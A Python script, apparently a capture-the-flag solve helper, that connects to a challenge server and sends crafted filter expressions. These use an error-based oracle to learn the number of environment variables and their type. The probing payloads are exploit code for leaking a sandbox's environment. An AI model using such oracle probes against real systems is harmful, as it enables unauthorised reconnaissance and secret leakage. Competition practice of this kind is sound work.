import socket
import solve_remote_live, json

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def query(expr):
    try:
        s = socket.create_connection(("challs.pyjail.club", 20219), timeout=5)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        buf = b""
        while b"expr: " not in buf:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
        if b"expr: " in buf:
            buf = buf.split(b"expr: ", 1)[1]
        
        s.sendall((expr + "\n").encode())
        token_re = solve_remote_live.TOKEN_RE
        while True:
            m = token_re.search(buf)
            if m:
                s.close()
                return m.group(1).decode()
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
        s.close()
        return "EOF"
    except Exception as e:
        return f"ERR:{e}"

if __name__ == "__main__":
    print("Testing remote environment structure...")
    
    # 1. Test if env | keys | length is 2 or something else
    for num in [1, 2, 3, 4, 5, 10]:
        if num in CHAINS:
            pred = predicate(CHAINS[num])
            res = query(f"env|keys|length|{pred}|error")
            print(f"env|keys|length == {num}: {res}")
            
    # 2. Test type of env
    # type returns a string: "object" (length 6)
    if 6 in CHAINS:
        pred = predicate(CHAINS[6])
        res = query(f"env|type|length|{pred}|error")
        print(f"env|type|length == 6 ('object'): {res}")
